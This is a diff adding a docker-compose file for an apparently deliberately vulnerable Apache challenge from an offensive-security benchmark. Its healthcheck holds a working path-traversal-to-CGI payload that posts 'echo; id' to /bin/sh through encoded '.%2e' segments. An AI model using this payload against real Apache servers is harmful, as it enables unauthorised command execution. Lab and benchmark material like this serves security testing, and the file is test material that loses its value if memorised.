@@ -1,0 +1,25 @@
+# Attack Drills shot: birch (XBOW-bench XBEN-031-24, Apache-2.0 upstream — see NOTICE)
+services:
+  web:
+    build:
+      context: ./apache
+      args:
+        - FLAG
+    ports:
+      - "0.0.0.0:18942:80"
+    cpus: "1.0"
+    mem_limit: 768m
+    healthcheck:
+      test: ["CMD-SHELL", "curl -sf -m 3 --data 'echo; id' 'http://127.0.0.1/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' | grep -q 'uid='"]
+      interval: 30s
+      timeout: 5s
+      retries: 3
+      start_period: 10s
+    restart: unless-stopped
+    networks: [lab]
+networks:
+  lab:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 172.31.42.0/24
